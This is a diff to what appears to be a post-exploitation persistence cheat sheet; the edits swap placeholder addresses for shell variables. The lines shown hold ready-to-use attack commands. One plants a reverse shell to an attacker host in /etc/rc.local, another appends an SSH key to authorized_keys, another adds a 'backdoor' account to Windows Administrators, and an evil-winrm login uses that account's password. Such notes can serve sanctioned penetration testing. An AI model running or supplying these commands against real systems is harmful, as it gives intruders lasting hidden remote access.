@@ -16,7 +16,7 @@ echo "ssh-rsa AAAAB3..." >> ~/.ssh/authorized_keys
 ### Persistent Reverse Shell via rc.local
 
 ```bash
-echo "nohup bash -i >& /dev/tcp/<attacker-ip>/<port> 0>&1 &" >> /etc/rc.local
+echo "nohup bash -i >& /dev/tcp/$LHOST/<port> 0>&1 &" >> /etc/rc.local
 ```
 
 ### Modify SSH Config
@@ -52,7 +52,7 @@ net localgroup Administrators backdoor /add
 ### Connect with Evil-WinRM
 
 ```bash
-evil-winrm -i 10.10.10.10 -u backdoor -p P@ssw0rd
+evil-winrm -i $IP -u backdoor -p P@ssw0rd
 ```
 
 ### Scheduled Task Persistence
